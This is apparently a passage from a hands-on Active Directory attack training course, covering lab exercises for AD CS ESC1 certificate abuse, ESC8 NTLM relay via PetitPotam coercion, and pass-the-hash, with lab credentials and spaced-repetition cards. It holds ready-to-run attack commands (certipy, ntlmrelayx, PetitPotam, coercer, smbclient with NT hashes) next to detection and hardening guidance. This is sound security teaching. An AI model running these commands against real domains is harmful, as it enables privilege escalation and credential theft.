Flag Effect -ca <name> CA name as listed in Step 1 (certipy find output shows it). -template <name> Template name to enroll against. -upn <upn> Identity to claim in the SAN. The CA does not validate this against the requestor.

Output: administrator.pfx written to the current directory. The PFX bundles the cert and the private key; certipy uses an empty password by default (-pfx-password '' to specify).

docs.title: Step 3: Authenticate via PKINIT
docs.text:
PKINIT (RFC 4556) is the Kerberos extension that lets a client authenticate with a public/private keypair instead of a password. The KDC validates the cert chain back to a trusted root and matches the SAN against an AD principal; the AS-REP includes a TGT for the matched principal. On un-hardened DCs the AS-REP also carries a PAC_CREDENTIAL_INFO blob containing the user's NTLM hash (Microsoft's pre-2022 behavior).

Kali - certipy auth

certipy auth -pfx administrator.pfx -dc-ip <dc_ip>
Flag Effect -pfx <file> The cert + key bundle from Step 2. -dc-ip <ip> KDC for the AS exchange.

Output includes the NTLM hash for Administrator (on un-hardened DCs) and stores a TGT at administrator.ccache.

docs.title: Step 4: Read the Flag
docs.text:
Two paths. Both reach the same file via the same Administrator identity; pick whichever is convenient.

Option A: pass-the-hash via NTLM. Works against any NTLM-accepting service (SMB, WMI, WinRM with -H):

Kali - PtH with the recovered Administrator hash

smbclient //corp-dc01.corp.nordport.local/C$ \
  -U Administrator --pw-nt-hash <hash> \
  -c "get esc1_flag_${OCR_SCOPE_TOKEN}.txt"
cat esc1_flag_${OCR_SCOPE_TOKEN}.txt
Token Effect --pw-nt-hash <hash> Authenticate using the NTLM hash directly (no password computation).

Option B: use the cached TGT. Works against Kerberos-accepting services and survives PKINIT hardening:

Kali - Use the Kerberos ticket

export KRB5CCNAME=administrator.ccache
smbclient //corp-dc01.corp.nordport.local/C$ -k \
  -c "get esc1_flag_${OCR_SCOPE_TOKEN}.txt"
cat esc1_flag_${OCR_SCOPE_TOKEN}.txt

Either path reads the file. Submit the OCR{...} value.

Common gotchas

  • Wrong CA name: -ca takes the CA's display name (often <Org>-<Server>-CA), not the host. certipy find shows the right value.
  • Template name case: PowerShell-managed templates are case-insensitive; certipy is strict. Use the exact name from certipy find.
  • PKINIT hardening (May 2022): on hardened DCs, Step 3 prints Got NULL credentials section instead of the NTLM hash. Option A fails; Option B still works.
  • Clock skew: PKINIT enforces the same 5-minute Kerberos clock skew rule. Sync first if Step 3 returns KRB_AP_ERR_SKEW.
  • Cert lifetime: the issued cert typically has a 1-year lifetime. Hold on to the PFX; you can re-auth without going through Step 2 again.

docs.title: Blue Team Perspective
docs.text:
Certificate enrollment generates dedicated events that defenders can pivot on. Most environments do not collect them.

Activity Event ID Where it fires Certificate issued 4886, 4887 CA Security log Certificate request received 4888 CA Security log PKINIT logon 4768 with Certificate Issuer Name field populated DC Security log Defender for Identity "Suspected ADCS abuse" MDI

What gets caught and what does not

Most ADCS abuse goes undetected because few SOCs ingest CA event logs. The single best detection is on event 4886/4887 with Subject = Administrator (or any privileged account) issued via a non-SmartCard-Logon template. SIEM rule: alert on any cert issuance where the Subject does not match the requesting principal's UPN. Cardinality is low; signal is very high.

docs.title: Hardening Note
docs.text:
Every SpecterOps ESC has a one-line fix. The work is finding them; the change is small.

ESC1 hardening

  • Run certipy find -vulnerable -enabled against your own environment monthly. Each hit is a finding.
  • On each ESC1 template: clear CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT OR scope enrollment to a specific group OR delete the template if unused.
  • Disable RC4-only PKINIT (forces strong ticket sigs).
  • Apply Microsoft's May 2022 PKINIT hardening (PerformTicketSignature = 1, KrbtgtFullPacSignature = 2).
  • Audit the CA-level setting EDITF_ATTRIBUTESUBJECTALTNAME2; remove if present (eliminates ESC6).
  • Forward CA event log (4886, 4887, 4888) to the SIEM with retention long enough for slow-burn abuse.

docs.title: Record Your Findings
docs.text:
CA name: Nordport-Issuing-CA

Template: WebSrv_<token> (ESC1)

Cert issued for SAN: administrator@corp.nordport.local

Recovered Administrator NT hash (un-hardened DC):

(32-hex-char NTLM hash, or N/A on hardened DC)

Flag:

(OCR{esc1_...})

docs.title: Analysis Questions
docs.text:
1. The defender mitigation for ESC1 is to either disable enrollee-supplies-subject on the template or to turn off Authenticated Users enrollment. What is the operational trade-off?

Reveal Answer

Disabling enrollee-supplies-subject is the surgical fix: the template still serves its intended purpose (issuing certs whose subject is built from AD), and ESC1 vanishes. The template's legitimate users may be inconvenienced if they need to specify a non-AD subject (uncommon for client-auth templates, common for web-server templates that need a specific FQDN in the SAN). Disabling Authenticated Users enrollment scopes the template to a specific group; it kills the broad attack surface but requires the operator to know which principals legitimately need the cert. Both fixes are typical recommendations; the choice depends on what the template is for. Most templates flagged as ESC1 in production are misconfigurations of templates that were never used for their intended purpose; deletion is often the right answer.

2. PKINIT yields both a TGT and (on un-hardened DCs) the NTLM hash. Microsoft hardened this with PerformTicketSignature in May 2022. What changes for the attacker on a hardened DC?

Reveal Answer

On a DC with PerformTicketSignature = 1 (the May 2022 hardening), PKINIT-issued TGTs include a Ticket Signature; the KDC no longer populates the PAC_CREDENTIAL_INFO with the user's NTLM hash. The attacker still gets a usable TGT (and so can authenticate to any Kerberos-aware service as Administrator), but cannot recover the NTLM hash directly. Effects on the attacker: (a) loses pass-the-hash to NTLM-only services; (b) loses overpass-the-hash convenience; (c) must use the TGT for everything, which means using -k Kerberos-aware tools and ensuring time skew is minimal. The TGT alone is still essentially Domain Admin equivalent for any Kerberos-accepting service. The hardening reduces blast radius but does not close the underlying ESC1 attack.

3. The CA-wide setting EDITF_ATTRIBUTESUBJECTALTNAME2 is a stronger version of ESC1 (it makes every template SAN-supplyable regardless of template flags). Why does Microsoft offer this setting at all?

Reveal Answer

Some legitimate CA enrollment scenarios from the early 2000s required the requestor to populate the SAN at enrollment time even on templates that did not have the explicit CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag set; certain web-server enrollment workflows and downlevel client integrations expected this. Microsoft kept the CA-level flag for backwards compatibility. The setting is essentially never needed in modern environments; defenders should ensure it is NOT set:

certutil -getreg policy\EditFlags

The output should not contain EDITF_ATTRIBUTESUBJECTALTNAME2. If it does, that is ESC6: every template on that CA accepts attacker-supplied SANs regardless of template configuration, and the entire CA is one cert request away from full Domain Admin compromise. Remove with certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2.

docs.title: Key Takeaways
docs.text:
• ESC1 = enrollee supplies SAN + low-privileged enrollment + client auth EKU + no manager approval.
  • certipy find -vulnerable enumerates every misconfigured template in one call.
  • certipy req -upn administrator@... requests a cert as the Administrator account.
  • certipy auth performs PKINIT and (on un-hardened DCs) prints the NTLM hash.
  • Defender mitigations: disable enrollee-supplies-subject, scope enrollment to specific groups, audit EDITF_ATTRIBUTESUBJECTALTNAME2.

docs.title: Cheat Sheet Recap
docs.text:
The four operations below cover the entire ESC1 chain. Pin this card; certipy is the only tool you need for most ADCS attacks in 2026.

Goal Command Find vulnerable templates certipy find -u <user>@<domain> -p '<pw>' -dc-ip <dc> -vulnerable -enabled Request cert with SAN certipy req -u <user>@<domain> -p '<pw>' -ca <CA-name> -template <Template> -upn administrator@<domain> -dc-ip <dc> PKINIT auth + recover hash certipy auth -pfx administrator.pfx -dc-ip <dc> Use ticket on hardened DC export KRB5CCNAME=administrator.ccache; smbclient //<dc>/C$ -k -c "ls"

docs.title: Spaced Repetition
docs.text:
Card 1: certipy find Vulnerable

Q: Write the certipy find command to enumerate vulnerable enabled templates as j.smith@corp.local / Pass# against DC 10.10.10.10.

Answer 
certipy find -u j.smith@corp.local -p 'Pass#' \
  -dc-ip 10.10.10.10 -vulnerable -enabled

Add -text -output report for a written summary. The output classifies each finding by ESC number (ESC1 through ESC15) with a short explanation.

Card 2: certipy req as Administrator

Q: Write the certipy req command to enroll a cert via the WebSrv template on CA Acme-CA for SAN administrator@corp.local, authenticating as j.smith / Pass#.

Answer 
certipy req -u j.smith@corp.local -p 'Pass#' \
  -ca Acme-CA -template WebSrv \
  -upn administrator@corp.local \
  -dc-ip 10.10.10.10

Output: administrator.pfx. The PFX contains the private key and the cert; default password is empty.

Card 3: certipy auth PKINIT

Q: Write the command to authenticate to AD using administrator.pfx and recover the TGT + NTLM hash.

Answer 
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10

Output: TGT cached at administrator.ccache, NTLM hash printed to stdout (un-hardened DCs only). On May-2022-hardened DCs, the hash is no longer included; only the TGT is usable.

Card 4: ESC1 Definition

Q: List the four template properties that together define ESC1.

Answer
  1. Low-privileged enrollment permissions (Authenticated Users, Domain Users, etc.). 2. Client Authentication or Smart Card Logon EKU. 3. No manager approval required. 4. CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT set (or any equivalent that lets the requestor populate the SAN). All four must be true; missing any breaks the chain.

Card 5: PKINIT Hardening

Q: What did Microsoft's May 2022 PKINIT hardening (PerformTicketSignature = 1) change, and what does the attacker lose?

Answer

The KDC adds a Ticket Signature to PKINIT-issued TGTs and stops populating PAC_CREDENTIAL_INFO with the user's NTLM hash. The attacker loses easy pass-the-hash from a PKINIT-recovered cert; they still get a working TGT but cannot use the NTLM hash on NTLM-only protocols. The TGT alone remains effectively Domain Admin for Kerberos-accepting services, so the attack is reduced in scope but not closed.

docs.title: Exercise 4.7: ADCS ESC8 (NTLM Relay to Web Enrollment)
Before You Begin
docs.text:
ESC8 chains three building blocks: (1) authentication coercion, (2) NTLM relay, (3) AD CS web enrollment with no Extended Protection for Authentication (EPA). PetitPotam (or a similar coercer) forces a target machine to authenticate to an attacker-controlled SMB endpoint; ntlmrelayx.py forwards that authentication to the IIS /certsrv enrollment page; the CA issues a certificate for the relayed machine; the attacker uses the cert to recover the machine's TGT and pivot.

The PetitPotam-relay-AD-CS chain cost many teams a long weekend in summer 2021. Microsoft's KB5005413 added mitigations (EPA on IIS, signing requirements), but the default install of AD CS Web Enrollment on Windows Server 2016 / 2019 / 2022 still leaves the attack possible unless an administrator explicitly hardens.

Exercise 4.7 gives you a PetitPotam-coerce-able machine MSSQL01_<TOKEN> and asks you to walk the full chain.

Tools required: impacket-ntlmrelayx, PetitPotam.py (or coercer), certipy. Pre-installed on Kali.

docs.title: Scenario
docs.text:
Marcus Bell: "ESC8 is the chain that made everyone update their AD CS in 2021. NTLM relay was already a thing. Web enrollment was already a thing. Putting them together was the sentence that cost a lot of teams a long weekend."

The flag is in MSSQL01_<TOKEN>$'s extensionAttribute3, readable by anyone authenticated as that machine account.

Credentials:

Username Password j.chen Welcome2026# (some PetitPotam variants need an auth context)

Domain: corp.nordport.local CA: corp-ca01 (web enrollment at http://corp-ca01/certsrv/) Victim: MSSQL01_<TOKEN>

docs.title: Your Objectives
docs.text:
• Confirm http://corp-ca01/certsrv/ is reachable
  • Start ntlmrelayx.py with --target http://corp-ca01/certsrv/certfnsh.asp --adcs --template Machine
  • Coerce MSSQL01_<TOKEN>$ to authenticate to your Kali via PetitPotam
  • Save the relayed certificate as machine.pfx
  • Use certipy auth to recover the machine's TGT and NT hash
  • Read extensionAttribute3 on MSSQL01_<TOKEN> via LDAP

docs.title: ESC8 Choreography in One Picture
docs.text:
ESC8 is three loosely-coupled bugs in a row. The diagram below traces the auth and the cert across all four hosts.

sequenceDiagram
    autonumber
    participant K as Kali (attacker)
    participant V as MSSQL01_<TOKEN><br/>(victim)
    participant CA as IIS /certsrv<br/>(corp-ca01)
    participant DC as KDC (corp-dc01)

    Note over K: ntlmrelayx.py listens on TCP/445 + TCP/80
    K->>V: PetitPotam EfsRpcOpenFileRaw \\<kali>\share\f
    V->>K: SMB connect (Net-NTLMv2 of MSSQL01_<TOKEN>$)
    K->>CA: HTTP POST /certsrv/certfnsh.asp<br/>NTLM challenge/response RELAYED from V
    CA-->>K: 200 OK<br/>certificate for MSSQL01_<TOKEN>$
    Note over K: machine.pfx written to disk
    K->>DC: PKINIT AS-REQ with machine.pfx
    DC-->>K: TGT for MSSQL01_<TOKEN>$<br/>(+ NTLM hash on un-hardened DCs)
    Note over K: read extensionAttribute3 via LDAP-bind as machine

docs.title: Coercer Decision Tree
docs.text:
PetitPotam is the famous coercer but is partially patched in many environments. The flowchart below is the order to try when the easy path is blocked.

flowchart TD
    Start["Need to coerce <victim>"]
    A["PetitPotam unauth"]
    B{"Auth fired?"}
    C["PetitPotam authed (-u/-p)"]
    D{"Auth fired?"}
    E["coercer (try all methods)"]
    F{"Auth fired?"}
    G["PrinterBug, ShadowCoerce,<br/>DFSCoerce variants individually"]
    H["Stop -- victim is fully patched"]

    Start --> A --> B
    B -- "yes" --> Done["Coercion succeeded"]
    B -- "no" --> C --> D
    D -- "yes" --> Done
    D -- "no" --> E --> F
    F -- "yes" --> Done
    F -- "no" --> G --> Done

docs.title: Coercion: MS-EFSRPC
docs.text:
The MS-EFSRPC protocol exists for legitimate Encrypting File System remote operations. It exposes RPC functions like EfsRpcOpenFileRaw that take a path argument. If you call the function with a path like \\<attacker_ip>\share\file.txt, the target server has to authenticate to <attacker_ip> to access that path. The authentication is performed by the LSA on behalf of the machine account; the credentials sent are the machine's own (Net-NTLM hash of the machine account password).

PetitPotam (CVE-2021-36942) is the most famous tool for triggering MS-EFSRPC coercion. Variants like PrinterBug, ShadowCoerce, DFSCoerce, and several others use other RPC interfaces with the same overall effect: a target machine is forced to send a Net-NTLM authentication to an attacker-chosen IP.

docs.title: Relay: ntlmrelayx with --adcs
docs.text: Captured Net-NTLM authentications cannot be cracked back to a machine account password (machine passwords are 240 random bytes; uncrackable). Relay solves the problem by forwarding the authentication to a relay target instead of trying to crack it. The IIS /certsrv endpoint accepts NTLM authentication from any domain machine and lets that machine request a certificate. ntlmrelayx with --adcs --template Machine automates: receive the relayed auth, request a Machine-template cert as the authenticated identity, save the resulting cert.

docs.title: The Machine template default
docs.text: The Machine template is published on every Enterprise CA by default. It allows Domain Computers to enroll, requires no manager approval, has the Client Authentication EKU, and binds the cert to the machine's identity. The combination of "any domain machine can enroll" + "the cert is for the machine's identity" + "the cert is good for client auth" is exactly what an attacker wants when they can relay machine authentication.

docs.title: Why the IIS site is vulnerable
docs.text:
The /certsrv IIS site historically did not require: - HTTPS (HTTP is enabled by default) - Channel Binding (Extended Protection for Authentication, "EPA") - SMB signing on the relay path (this protects relay TO SMB; HTTP relay has its own EPA story)

Without HTTPS + EPA, NTLM authentications can be relayed from one channel (SMB inbound from the coerced victim) to another (HTTP outbound to /certsrv) without channel-binding mismatch. KB5005413 documents the hardening: enable HTTPS-only, enable EPA on IIS, configure RPC filters that block the coercion methods. Many environments are still partially mitigated.

docs.title: ntlmrelayx with AD CS
docs.text:
ntlmrelayx.py \
  -t http://corp-ca01/certsrv/certfnsh.asp \
  --adcs --template Machine \
  -smb2support
Flag Effect -t relay target URL (the /certsrv enrollment endpoint) --adcs request a certificate from the relayed authentication --template Machine use the Machine certificate template -smb2support accept SMB2 inbound (the coerced auth lands here)

When a relay succeeds, ntlmrelayx writes the issued certificate to disk (PEM by default; -output-file machine.pfx for PFX format).

docs.title: PetitPotam
docs.text:
PetitPotam.py <kali_ip> mssql01_<TOKEN>.corp.nordport.local

Optional auth context (some variants need it on patched DCs):

PetitPotam.py -u j.chen -p 'Welcome2026#' -d corp.nordport.local \
  <kali_ip> mssql01_<TOKEN>.corp.nordport.local

Output: the target reaches out to <kali_ip> over SMB.

docs.title: coercer (multi-method coercion)
docs.text:
coercer coerce -t mssql01_<TOKEN>.corp.nordport.local \
  -u j.chen -p 'Welcome2026#' -d corp.nordport.local \
  -l <kali_ip>

Tries every coercion method in sequence. Useful when PetitPotam alone is patched but other variants (ShadowCoerce, DFSCoerce, PrinterBug) still work.

docs.title: certipy auth from a machine cert
docs.text:
certipy auth -pfx machine.pfx -dc-ip <dc_ip>

Output: machine TGT cached, machine NTLM hash printed.

docs.title: Step 1: Confirm Targets
docs.text:
A two-target attack needs two reachability checks. The CA must be alive and accepting NTLM at /certsrv; the victim must be reachable on the RPC endpoint mapper (TCP 135) so PetitPotam can call EFSRPC.

Kali - Verify CA web enrollment is up

curl -I http://corp-ca01.corp.nordport.local/certsrv/ -u j.chen:'Welcome2026#'
Flag Effect -I HEAD request only; no body. -u user:pass Inline HTTP auth credentials.

Expect a HTTP/1.1 401 Unauthorized first (NTLM challenge), then HTTP/1.1 200 OK once curl handles the NTLM dance. Confirms /certsrv is reachable and uses NTLM/Negotiate. If you see HTTPS-only, the site is hardened and ESC8 will not work.

Kali - Verify victim is up

nc -w 5 mssql01_${OCR_SCOPE_TOKEN}.corp.nordport.local 135 </dev/null

A clean exit (exit code 0) means TCP 135 is open. The PetitPotam coerce uses an RPC interface served by the endpoint mapper.

docs.title: Step 2: Start the Relay Listener
docs.text:
ntlmrelayx is the listener. It binds SMB (TCP 445) and HTTP (TCP 80) and waits for inbound NTLM authentications. Each captured authentication is forwarded to the configured target. Run it in its own terminal so you can see the relay logs in real time.

Kali - ntlmrelayx, AD CS mode

sudo ntlmrelayx.py \
  -t "http://corp-ca01.corp.nordport.local/certsrv/certfnsh.asp" \
  --adcs --template Machine \
  -smb2support \
  -output-file machine
Flag Effect -t <url> Relay target. certfnsh.asp is the IIS endpoint that processes a CSR. --adcs After relay succeeds, request a certificate using the relayed identity. --template Machine Default-published Machine template; allows Domain Computers to enroll. -smb2support Accept SMB2 inbound (most modern Windows speaks SMB2 by default). -output-file machine Write the captured cert to machine.pfx (extension auto-applied).

The listener opens on TCP/445 and TCP/80 by default. Wait for incoming auth.

docs.title: Step 3: Trigger the Coercion
docs.text:
PetitPotam calls the EFSRPC interface on the victim with a UNC path argument pointing at your Kali. The victim's LSA dutifully tries to access that path, and the access requires authentication; the LSA sends the machine account's Net-NTLMv2 over SMB to your Kali. The relay listener catches that auth and forwards it to /certsrv.

In a second terminal:

Kali - PetitPotam

KALI_IP=$(ip -4 -o addr show eth0 | awk '{print $4}' | cut -d/ -f1)
PetitPotam.py "$KALI_IP" "mssql01_${OCR_SCOPE_TOKEN}.corp.nordport.local"
Token Effect ip -4 -o addr show eth0 Print one-line IPv4 addresses for eth0. awk '{print $4}' Field 4 is the CIDR-notation address. cut -d/ -f1 Strip the /24 suffix; we want just the IP. <attacker_ip> First positional: where the victim should authenticate to. <victim_fqdn> Second positional: the host to coerce.

The output ends with Trying to coerce... done! or similar. Switch back to the ntlmrelayx terminal; you should see:

[*] HTTPS server returned 200; Authenticated
[*] Got certificate for MSSQL01_<TOKEN>$@CORP.NORDPORT.LOCAL
[*] Saved certificate to machine.pfx

docs.title: Step 4: Recover the Machine TGT and Hash
docs.text:
The relayed cert is good for client authentication. PKINIT against the KDC uses the cert as proof-of-identity and returns a TGT for the machine account (and, on un-hardened DCs, the NT hash via PAC_CREDENTIAL_INFO).

Kali - certipy auth from the relayed cert

certipy auth -pfx machine.pfx -dc-ip <dc_ip>

Output reports the machine principal (MSSQL01_<TOKEN>$@CORP.NORDPORT.LOCAL), TGT cached at mssql01_<TOKEN>$.ccache, and the NT hash for the machine account.

docs.title: Step 5: Read the Per-Token Flag
docs.text:
The machine account itself has read access on its own object's attributes. Three equivalent paths to read the flag attribute follow; pick the one that matches what your DC accepts.

Kali - LDAP query as the machine account

TOK=$(echo "${OCR_SCOPE_TOKEN}" | tr 'a-z' 'A-Z')
ldapsearch -x -LLL -H ldap://corp-dc01 \
  -D "MSSQL01_${TOK}$@corp.nordport.local" \
  -w '<NT hash from certipy>' \
  -b "DC=corp,DC=nordport,DC=local" \
  "(name=MSSQL01_${TOK})" extensionAttribute3

Some LDAP clients reject NT-hash-as-password for simple binds; alternative is to use the cached TGT:

export KRB5CCNAME="mssql01_${OCR_SCOPE_TOKEN}\$.ccache"
ldapsearch -Y GSSAPI -LLL -H ldap://corp-dc01 \
  -b "DC=corp,DC=nordport,DC=local" \
  "(name=MSSQL01_${TOK})" extensionAttribute3
Flag Effect -Y GSSAPI Use GSSAPI/Kerberos for the bind (instead of -x simple). KRB5CCNAME=<file> Point GSSAPI at the cached TGT.

Or, simplest, use netexec with the recovered hash:

netexec ldap corp-dc01 \
  -u "MSSQL01_${TOK}\$" -H '<NT hash>' \
  -d corp.nordport.local \
  --query "(name=MSSQL01_${TOK})" extensionAttribute3

The attribute value is your flag.

Common gotchas

  • Listener bind failure: ntlmrelayx fails to bind 445 if your Kali is running Samba. sudo systemctl stop smbd nmbd before launching.
  • Coerce fires but no relay: ntlmrelayx logs "Authentication received" but no cert appears. Common causes: the target /certsrv is HTTPS-only (HTTPS scheme needed); the IIS site has EPA enforced (relay fails channel binding); the Machine template is disabled or not auto-published.
  • MSSQL01 vs mssql01: PetitPotam works either case, but ntlmrelayx logs the case as the LSA sent it. The pfx filename is lowercase; the AD object name is uppercase. Use tr to upper-case when querying AD.
  • PetitPotam patched: try coercer coerce -t <victim> -l <kali_ip> instead; coercer cycles through every known method.
  • NT hash format: certipy prints the hash as <lm>:<nt>. Use only the second segment (the NT half) with netexec's -H.

docs.title: Blue Team Perspective
docs.text:
ESC8 leaves three distinct breadcrumbs across three hosts. Defenders that correlate them catch this attack reliably.

Activity Event ID Where it fires Inbound NTLM auth from machine to attacker IP 4624 logon type 3 (anonymous-ish) DC + victim Security log Cert issued to coerced machine 4886, 4887 CA Security log PetitPotam-style RPC call RPC filters / EDR Victim host PKINIT logon from machine cert 4768 with Certificate Issuer Name DC Security log

What detects ESC8 fastest

A SIEM rule that joins on machine identity catches ESC8 without needing rare events: alert when the same machine SAM appears in (a) an unusual outbound NTLM auth and (b) a cert issuance from the CA within 60 seconds. That correlation has near-zero false positives.

docs.title: Hardening Note
docs.text:
KB5005413 published the canonical mitigations. Apply all three layers; defense in depth matters here because each individual mitigation has been bypassed.

ESC8 hardening

  • Enable HTTPS-only on /certsrv (disable HTTP at the IIS binding level).
  • Enable EPA (Extended Protection for Authentication) on the /certsrv IIS site; channel-binds NTLM to the TLS channel.
  • Apply RPC filters blocking PetitPotam, PrinterBug, ShadowCoerce, DFSCoerce coercion methods.
  • Disable NTLM on internal-facing services that can be moved to Kerberos-only.
  • Enforce SMB signing required so coerced auths are not relayable to SMB targets either.
  • Forward CA event logs (4886/4887) to the SIEM with retention for slow-burn abuse.

docs.title: Record Your Findings
docs.text:
Coerced machine:

MSSQL01_<TOKEN>

Cert obtained:

machine.pfx (Machine template, valid for client auth)

Recovered NT hash:

(32-hex-char NTLM hash of MSSQL01_<TOKEN>$)

Flag:

(OCR{esc8_...})

docs.title: Analysis Questions
docs.text:
1. KB5005413 documents three layers of mitigation: HTTPS-only, EPA, and RPC filters that block the coercion methods. Which is the strongest, and why is the chain often only partially mitigated in production?

Reveal Answer

The strongest single mitigation is EPA (Extended Protection for Authentication) on the IIS /certsrv site combined with HTTPS-only. EPA channel-binds the NTLM authentication to the TLS channel, so an attacker cannot relay a session captured on one transport (SMB inbound) to another transport (HTTP outbound to /certsrv) without breaking the channel binding. With EPA enforced and HTTPS-only, the relay step fails regardless of whether coercion succeeded. RPC filters that block PetitPotam-style coercion are useful but incomplete: every blocked method has a successor (PetitPotam -> ShadowCoerce -> DFSCoerce -> CheeseOunce -> ...). In production the chain is often partially mitigated because: (a) enabling HTTPS on /certsrv requires a cert chain configuration that some teams have not done, (b) EPA breaks some legacy enrollment scripts that did not handle channel binding, (c) RPC filters require regular maintenance as new coercion methods are published. The pragmatic recommendation is the layered approach: do all three.

2. The relayed machine account has a 240-byte random password. The attack does not crack the password; it captures a usable certificate. What does the cert give you that the password (if you had it) would not?

Reveal Answer

The cert and the machine password give you the same authentication capability against AD: both yield a usable Kerberos TGT for the machine account, which can read the machine's own attributes, perform any operation the machine is configured to perform, and (critically) is often a stepping stone to local SYSTEM on the host itself via S4U2self. The advantage of the cert: (a) it persists across machine password rotations; the cert remains valid for its lifetime (typically 1 year for Machine templates) regardless of what happens to the password; (b) you obtain the cert without ever needing to read or compute the password, so the chain works even if the machine's keytab is unrecoverable; (c) some downstream protocols (PKINIT, smartcard logon, certain RDP modes) accept the cert directly without converting back to NTLM. So the cert is strictly more flexible. For long-term persistence on a compromised machine account, an attacker who could recover the password might still go through the cert path explicitly because the cert outlasts the password rotation.

3. The machine's NTLM hash is printed by certipy auth. With the machine hash, what can the attacker do to the underlying host?

Reveal Answer

A lot. The machine hash is the LSA secret for the host's machine account. An attacker with the hash can: (a) compute a Silver Ticket forging a TGS for any service running as the machine account (typically cifs/<host>, host/<host>, RPCSS/<host>); (b) authenticate to the host as the machine itself, which has access to its own LSA secrets and can extract every cached credential; (c) S4U2self via the machine to impersonate any user (computer accounts have implicit T2A4D-like behavior for self-targeted services); (d) decrypt DPAPI-protected secrets stored in the machine context (Windows credentials saved as the SYSTEM account); (e) read the SAM database and recover any local account hashes. From the machine hash, local SYSTEM on the host is one Silver Ticket away, and from there the rest of the local machine state is open. ESC8 plus a juicy victim host is essentially full local compromise of that host plus a foothold for further lateral movement.

docs.title: Key Takeaways
docs.text:
• ESC8 = coerce + relay + AD CS web enrollment + no EPA.
  • ntlmrelayx.py with --adcs --template Machine automates the relay-to-cert step.
  • PetitPotam is the famous coercer; coercer.py tries every variant.
  • The recovered machine cert yields a TGT and (on un-hardened DCs) the machine's NTLM hash.
  • Mitigation: HTTPS + EPA on /certsrv, RPC filters blocking coercion methods, signing requirements.

docs.title: Cheat Sheet Recap
docs.text:
The four operations below run the entire ESC8 chain. Have two terminals open: one for the relay listener, one for the coercer.

Goal Command Start relay listener sudo ntlmrelayx.py -t "http://<ca>/certsrv/certfnsh.asp" --adcs --template Machine -smb2support -output-file machine Coerce victim (PetitPotam) PetitPotam.py <kali_ip> <victim_fqdn> Coerce victim (multi-method) coercer coerce -t <victim_fqdn> -u <user> -p '<pw>' -d <domain> -l <kali_ip> Recover TGT + hash from cert certipy auth -pfx machine.pfx -dc-ip <dc>

docs.title: Spaced Repetition
docs.text:
Card 1: ntlmrelayx ADCS Mode

Q: Write the ntlmrelayx command to relay incoming NTLM auth to corp-ca01's certfnsh.asp endpoint, requesting a Machine-template cert.

Answer 
sudo ntlmrelayx.py \
  -t "http://corp-ca01/certsrv/certfnsh.asp" \
  --adcs --template Machine \
  -smb2support

Add -output-file machine to save the resulting cert as machine.pfx. Default listeners are TCP/80 and TCP/445; the coerced auth typically arrives on 445.

Card 2: PetitPotam Trigger

Q: Write the PetitPotam command to coerce mssql01.corp.local to authenticate to your Kali at 10.10.10.99.

Answer 
PetitPotam.py 10.10.10.99 mssql01.corp.local

Add -u user -p pass -d corp.local if the unauthenticated EFSRPC call has been patched and you need an authenticated context. Variants if PetitPotam alone fails: coercer coerce -t mssql01.corp.local -l 10.10.10.99 tries every known coercion method.

Card 3: Cert-to-Hash via certipy

Q: One command to recover a TGT and NTLM hash from a captured machine cert machine.pfx.

Answer 
certipy auth -pfx machine.pfx -dc-ip 10.10.10.10

Output: machine principal name, TGT cached at <sam>$.ccache, NTLM hash printed. On May-2022-hardened DCs the hash is no longer included; the TGT is still usable.

Card 4: KB5005413 Three Mitigations

Q: List the three KB5005413 mitigations for ESC8.

Answer
  1. HTTPS-only on /certsrv (disable HTTP, force TLS). 2. EPA (Extended Protection for Authentication) on the IIS site (channel-bind NTLM to the TLS channel). 3. RPC filters that block the coercion methods (PetitPotam EFSRPC, PrinterBug, etc.). The first two prevent the relay step; the third prevents the coercion. Layered defense; do all three.

Card 5: Why the Cert Outlasts the Password

Q: A relayed Machine cert is good for 1 year. Why is that more useful than the machine's password (which rotates every 30 days)?

Answer

Machine passwords rotate automatically every 30 days by default; an attacker who captured the password loses it at the next rotation. A cert is good for its full validity period (typically 1 year for Machine templates) regardless of password rotation, so the attacker has a stable identity for the machine for the cert's lifetime. The defender's response is to revoke the cert (CRL update) when the compromise is detected, but unless the defender knows the cert exists, it remains a working identity until expiration.

docs.title: Before You Begin
docs.text:
NTLM authentication is challenge-response over the user's NT hash. Anywhere NTLM is accepted, the NT hash alone is sufficient; you never need the plaintext. The technique is "pass-the-hash" (PtH). Modern AD environments still accept NTLM on SMB, WMI, WinRM (kind of), MSSQL, and any other protocol that runs the NTLMSSP exchange. Plaintext is convenience; the NT hash is the actual currency.

Exercise 5.1 gives you the local Administrator NT hash for a per-student member server and asks you to authenticate, run commands, and read the per-token flag.

Tools required: netexec, psexec.py, wmiexec.py, smbexec.py, evil-winrm. Pre-installed on Kali.

docs.title: Scenario
docs.text:
Marcus Bell: "Plaintext passwords are nice. Hashes are enough."

The hash for Administrator on ws-mem-<token> is shown in your lab dashboard. The flag file is C:\flags\pth_flag_<token>.txt.

Credentials:

Username Hash Source Administrator (local) (per-token NT hash) Lab dashboard

Target: ws-mem-<token>

docs.title: Your Objectives
docs.text:
• Verify SMB authentication with the hash
  • Choose between psexec.py, wmiexec.py, smbexec.py, and evil-winrm for command execution
  • Read the per-token flag

docs.title: NTLM Authentication With a Hash
docs.text:
The diagram below shows the canonical three-message NTLMSSP exchange. The attacker has the NT hash; the server has its stored copy. The plaintext password never appears anywhere.

sequenceDiagram
    autonumber
    participant C as Client (Kali)
    participant S as Server (ws-mem-token)

    C->>S: NEGOTIATE_MESSAGE<br/>"I want NTLMv2"
    S-->>C: CHALLENGE_MESSAGE<br/>random 8-byte challenge
    Note over C: Compute HMAC-MD5(NT_HASH, challenge + client_blob)
    C->>S: AUTHENTICATE_MESSAGE<br/>username + computed HMAC
    Note over S: Compute the same HMAC against stored NT_HASH<br/>compare, and on a match grant the session
    S-->>C: SMB session established as Administrator

docs.title: Tool Picker: Noise vs Capability
docs.text:
Four common execution paths exist on top of PtH. The table below ranks them so you pick the right tool for the job.

Tool Privilege Noise Best for evil-winrm Administrator low (WinRM looks like normal admin traffic) interactive PowerShell wmiexec.py Administrator medium (WMI process create) one-shot commands smbexec.py SYSTEM medium-high (SMB service install) when you need SYSTEM and WinRM is off psexec.py SYSTEM high (event 7045 service install) classic, but loud

docs.title: Background: How Pass-the-Hash Works
docs.text:
NTLM authentication is a three-message exchange:

